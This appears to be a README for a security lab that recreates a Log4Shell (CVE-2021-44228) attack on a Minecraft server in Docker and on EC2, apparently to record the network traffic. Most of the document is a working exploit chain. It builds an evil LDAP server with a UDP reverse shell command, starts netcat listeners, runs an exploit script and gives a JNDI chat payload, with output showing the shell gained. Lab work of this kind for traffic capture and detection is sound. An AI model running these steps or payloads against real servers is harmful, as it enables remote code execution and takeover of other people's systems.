# Infrastructure
This document describes how to re-create the lab infrastructure.
## Docker
The attacker machine host and ports can be customized by changing the following environment settings in a `docker-compose.override.yml` file:
```yaml
environment:
    PAYLOAD_SERVER_PORT: 8000
    HOSTNAME: "attacker.evil.com"
    REVERSE_SHELL_PORT: 6666
    LDAP_PORT: 389
hostname: attacker.evil.com
```
### Start containers
```
$ cd docker/
$ docker-compose up -d
```

### Legit player traffic
If you want to add some background noise, connect with a regular Minecraft client to your local server, mind to create a new Minecraft installation with v1.17.1 to be able to connect.

### log4j exploitation
```
# [term 0] udp reverse shell listener 
$ docker-compose exec hacker nc -u -nlvp 6666
Bound on 0.0.0.0 6666
```
```
# [term 1] try to exploit the server
$ docker-compose exec hacker python3 minecraft-log4shell.py -o -u user1234 -s vuln.minecraft-server.com -r hacker.evil.com --dns c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh --rce ldap://hacker.evil.com:389/#poc
....
[minecraft-log4shell] sending jndi:ldap rce udp bash reverse shell ...
Message (CHAT): {"translate":"chat.type.text","with":[{"insertion":"user1234","clickEvent":{"action":"suggest_command","value":"/tell user1234 "},"hoverEvent":{"action":"show_entity","contents":{"type":"minecraft:player","id":"c963d30f-bd07-3969-a89d-9702f2f81e56","name":{"text":"user1234"}}},"text":"user1234"},"${jndi:ldap://hacker.evil.com:389/#poc}"]}
[minecraft-log4shell] disconnecting...
```
Alternatively connect via a regular Minecraft client and paste this in the chat:
```
${jndi:ldap://hacker.evil.com:389/#poc}
```
After RCE you will get a shell:
```
# [term 0]
...
Connection received on 192.168.112.3 59611
$ id 
uid=1000(minecraft) gid=1000(minecraft) groups=1000(minecraft)
$ 
```

### tcpdump recording
```
$ docker-compose down
```

The pcap file will be located in `docker/tcpdump/capture.pcap`.
**warning**: it adds a lot of docker management related traffic.

## VPS/EC2
### Hacker machine setup
A EC2 t2.micro (AMI) will do, add a security group with the following inbound rules:

| Protocol | Port | Source    | Description       |
| -------- | ---- | --------- | ----------------- |
| SSH/TCP  | 22   | 0.0.0.0/0 | Administration    |
| LDAP/TCP | 389  | 0.0.0.0/0 | Evil LDAP Server  |
| TCP      | 8000 | 0.0.0.0/0 | Jetty file server |
| UPD      | 6666 | 0.0.0.0/0 | Reverse shell     |


```
# Connect to the EC2 instance
$ ssh -i key-priv.pem ubuntu@18.212.74.161

# install git:	
$ sudo yum install git -y

# git clone https://github.com/ammaraskar/pyCraft.git & cd pyCraft
sudo pip3 install -r requirements.txt

# copy minecraft-log4shell.py (modified start.py script)
wget https://gist.githubusercontent.com/righel/d2fe544b7a988bb98b5d4b3c86166cc3/raw/79681d817b1d7b2d0b9e6a7309a0dd919b2a2a45/minecraft-log4shell.py

# install java:
sudo yum install java-1.8.0-openjdk
sudo yum install java-1.8.0-devel

# install maven:
$ sudo wget https://repos.fedorapeople.org/repos/dchen/apache-maven/epel-apache-maven.repo -O /etc/yum.repos.d/epel-apache-maven.repo
$ sudo sed -i s/\$releasever/6/g /etc/yum.repos.d/epel-apache-maven.repo
$ sudo yum install -y apache-maven

# compile pimps/JNDI-Exploit-Kit
$ git clone https://github.com/pimps/JNDI-Exploit-Kit.git & cd JNDI-Exploit-Kit/
$ mvn clean package -DskipTests
```

Start screen:
```
screen -S log4shell
```

Start evil LDAP payload server:
```
# [screen 0]
$ cd ~/JNDI-Exploit-Kit
$ sudo java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "sh -i >& /dev/udp/18.212.74.161/6666 0>&1" -L "18.212.74.161:389" -J "18.212.74.161:8000" -O LDAP
```

Start reverse shell listener:
```
# screen [1]
$ nc -u -nlvp 6666
```

Exploit:
```
# [screen 2]
cd ~/pyCraft
python3 minecraft-log4shell.py -o -u user1234 -s 44.202.61.172 -r 18.212.74.161 --dns c8nfads2vtc0000srss0grk4fxryyyyyr.interact.sh --rce ldap://18.212.74.161:389/1svssl
```

### Vulnerable Minecraft server setup
A EC2 t2.medium (ubuntu 20.04) will do, add a security group with the following inbound rules:

| Protocol | Port  | Source    | Description        |
| -------- | ----- | --------- | ------------------ |
| SSH/TCP  | 22    | 0.0.0.0/0 | Administration     |
| TCP      | 25565 | 0.0.0.0/0 | Minecraft protocol |


#### Install server depedencies
```
# Connect to the EC2 instance
$ ssh -i key-priv.pem ubuntu@44.202.61.172

# Download Minecraft Java Edition Server v1.18 (vulnerable to CVE-2021-44228)
$ mkdir minecraft & cd minecraft/
$ wget https://launcher.mojang.com/v1/objects/3cf24a8694aca6267883b17d934efacc5e44440d/server.jar -O server_1.18.jar

# Install Java17
$ sudo apt update
$ sudo apt install openjdk-17-jre-headless -y
```

#### Server settings 
Create a `server.properties` file with the following content:
```
#Minecraft server properties
enable-jmx-monitoring=false
rcon.port=25575
gamemode=survival
enable-command-block=false
enable-query=false
level-name=world
motd=A Minecraft Server
query.port=25565
pvp=true
difficulty=easy
network-compression-threshold=256
require-resource-pack=false
max-tick-time=60000
use-native-transport=true
max-players=20
online-mode=false
enable-status=true
allow-flight=false
broadcast-rcon-to-ops=true
view-distance=10
server-ip=
resource-pack-prompt=
allow-nether=true
server-port=25565
enable-rcon=false
sync-chunk-writes=true
op-permission-level=4
prevent-proxy-connections=false
hide-online-players=false
resource-pack=
entity-broadcast-range-percentage=100
simulation-distance=10
rcon.password=
player-idle-timeout=0
force-gamemode=false
rate-limit=0
hardcore=false
white-list=false
broadcast-console-to-ops=true
spawn-npcs=false
spawn-animals=false
function-permission-level=2
text-filtering-config=
spawn-monsters=false
enforce-whitelist=false
resource-pack-sha1=
spawn-protection=0
max-world-size=10000
```

#### Accept EULA
```
$ echo "eula=true" > eula.txt
```

#### Start the server
```
$ screen -S minecraft

$ java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar server_1.18.jar
[...]
[15:36:10] [Server thread/INFO]: Done (47.566s)! For help, type "help"
```

#### Start network traffic recording
```
# Create a new screen tab [Ctrl+a,c]
# Start recording the network traffic
$ sudo tcpdump -i eth0 -w capture.pcap
```

#### Downloading the pcap
```
$ scp -i key-priv.pem ubuntu@44.202.61.172://home/ubuntu/minecraft/capture.pcap capture.pcap
# trim last ssh connection to stop the recording
$ editcap -r capture.pcap capture_trim.pcap 0-END # END=end packet number
```

# References
* https://github.com/mbechler/marshalsec
* https://github.com/pimps/JNDI-Exploit-Kit
* https://github.com/xiajun325/apache-log4j-rce-poc
* https://github.com/ammaraskar/pyCraft
* https://minecraft.fandom.com/wiki/Tutorials/Setting_up_a_server
* https://logging.apache.org/log4j/2.x/manual/lookups.html
* https://github.com/ammaraskar/pyCraft
* https://github.com/swisskyrepo/PayloadsAllTheThings